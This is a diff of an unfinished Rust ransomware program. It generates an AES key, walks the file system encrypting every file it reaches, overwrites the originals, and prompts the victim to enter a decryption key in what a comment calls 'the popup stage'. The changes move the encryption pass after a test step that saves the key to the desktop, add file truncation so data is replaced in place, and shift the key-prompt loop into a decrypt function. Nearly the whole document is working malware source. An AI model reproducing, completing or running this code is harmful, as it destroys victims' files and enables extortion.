@@ -45,33 +45,12 @@ fn main() {
     let key = Aes256GcmSiv::generate_key(rng);
     let cipher = Aes256GcmSiv::new(&key);
 
-    traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
-
     //TESTCODE: delete later. shows the key so i dont lock myself out
     //create a file called key.txt and write the key to it
     let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
     writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
 
-    loop {
-        //TODO: move all of this to a decryption function
-        let mut user_input = String::new();
-        //FIXME: thisis the popup stage
-        println!("Enter decryption key pls: ");
-        io::stdin().read_line(&mut user_input).unwrap();
-        let user_input_str = user_input.trim(); //convert to bytes
-
-        //key length 32, nonce length 12
-        if user_input_str.len() != 64 {
-            //64 because it's in hex
-            //print error
-            println!("Invalid key length: {}", user_input_str.len());
-        } else {
-            let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
-
-            //FIXME: up to here today
-            // let decrypt_key = GenericArray::clone_from_slice(&user_input_bytes.as_slice());
-        }
-    }
+    traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
 }
 
 fn display_message() {
@@ -171,7 +150,7 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
 
                         // encrypt(entry.path(), cipher);
                     } else {
-                        decrypt(entry.path(), cipher)?;
+                        decrypt(entry.path(), cipher);
                     }
                 }
             }
@@ -191,11 +170,13 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
     // Open a file with append option
 
-    println!("encrypting file: {}", path.display()); //FIXME: error testing
+    // println!("encrypting file: {}", path.display()); //FIXME: error testing
 
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
+
+    let mut file = File::create(path)?;
 
     //TODO: make a nonce, use it, append to the beginning or end of file
     let mut rng = ChaCha20Rng::from_entropy();
@@ -233,7 +214,27 @@ impl From<walkdir::Error> for MyError {
  * Decrypt a file using a given key
  * this is not finished. the main decryption is in main atm
  */
-fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), Error> {
+fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
+    loop {
+        //TODO: move all of this to a decryption function
+        let mut user_input = String::new();
+        //FIXME: thisis the popup stage
+        println!("Enter decryption key pls: ");
+        io::stdin().read_line(&mut user_input).unwrap();
+        let user_input_str = user_input.trim(); //convert to bytes
+
+        //key length 32, nonce length 12
+        if user_input_str.len() != 64 {
+            //64 because it's in hex
+            //print error
+            println!("Invalid key length: {}", user_input_str.len());
+        } else {
+            let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
+
+            //FIXME: up to here today
+            // let decrypt_key = GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+        }
+    }
     //TODO: THIS CODE IS CURRENTLY IN THE MAIN FUNCTION
     // loop {
     //     let mut user_input = String::new();
